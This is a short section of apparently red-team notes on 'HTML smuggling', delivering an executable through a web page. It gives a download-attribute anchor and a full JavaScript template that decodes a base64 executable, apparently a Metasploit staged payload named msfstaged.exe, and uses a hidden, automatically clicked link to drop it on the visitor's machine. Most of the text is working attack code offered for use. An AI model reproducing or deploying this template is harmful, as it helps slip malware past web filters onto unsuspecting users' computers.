### HTML Smuggling

To make use of the download attribute in HTML5 we can make use of the download attribute anchor tag. Unlikely to use this since this is pretty obvious, but good to be aware of.
```html
<html>
    <body>
      <a href="/payload.exe" download="payload.exe">DownloadMe</a>
   </body>
</html>
```

More likely to be effective is the following embedded Javascript that will translate a base64 payload into an octet stream, load it into memory as a file object, then create the HTML object above, but with the styling configured such that it won't be displayed, then use Javascript to click on the link.
```bash
base64 payload.exe
```
```html
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
      		}
      		
      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...'
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```